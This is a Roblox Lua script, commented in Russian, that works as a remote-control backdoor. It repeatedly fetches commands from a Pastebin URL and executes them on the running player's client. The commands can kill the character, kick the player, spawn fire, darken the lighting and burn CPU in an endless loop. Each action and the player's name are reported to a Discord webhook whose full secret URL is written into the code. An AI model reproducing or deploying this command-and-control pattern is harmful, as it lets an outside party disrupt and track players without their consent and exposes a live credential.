local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")

-- Настройки
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"
local PASTEBIN_URL = "https://pastebin.com/raw/VfCXKNdB"

local lastCommand = "" -- Чтобы не повторять одно и то же
local LocalPlayer = Players.LocalPlayer

-- Функция отправки логов в Discord
local function logToDiscord(action)
    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 Команда исполнена",
            ["description"] = "**Действие:** " .. action .. "\n**Игрок:** " .. LocalPlayer.Name,
            ["color"] = 0x00ff00
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
    end)
end

-- Система команд
local Commands = {
    ["kill"] = function() LocalPlayer.Character.Humanoid.Health = 0 end,
    ["rejoin"] = function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end,
    ["fire"] = function() Instance.new("Fire", LocalPlayer.Character.HumanoidRootPart).Name = "TempFire" end,
    ["unfire"] = function() 
        local f = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("TempFire")
        if f then f:Destroy() end
    end,
    ["darktime"] = function()
        game.Lighting.Brightness = 0
        task.wait(5)
        game.Lighting.Brightness = 2
    end,
    ["lag"] = function()
        _G.Lagging = true
        task.spawn(function()
            while _G.Lagging do 
                for i=1, 1000000 do local a = i * i end
                task.wait()
            end
        end)
    end,
    ["unlag"] = function() _G.Lagging = false end
}

-- Главный цикл проверки Pastebin
print("System Started. Waiting for commands from Pastebin...")

while true do
    local success, currentCommand = pcall(function()
        return game:HttpGet(PASTEBIN_URL)
    end)

    if success and currentCommand ~= lastCommand then
        lastCommand = currentCommand
        
        -- Анализ команды (например: speed 50 или kill)
        local args = string.split(currentCommand, " ")
        local cmdName = args[1]:lower()
        local val = args[2]

        if Commands[cmdName] then
            Commands[cmdName]()
            logToDiscord(currentCommand)
        elseif cmdName == "speed" then
            LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(val) or 16
            logToDiscord("Установлена скорость: " .. val)
        elseif cmdName == "jump" then
            LocalPlayer.Character.Humanoid.JumpPower = tonumber(val) or 50
            logToDiscord("Прыжок изменен: " .. val)
        elseif cmdName == "kick" then
            logToDiscord("Кикнут с причиной: " .. (val or "None"))
            LocalPlayer:Kick(val)
        end
    end

    task.wait(2) -- Проверка каждые 2 секунды, чтобы Roblox не забанил за частые запросы
end
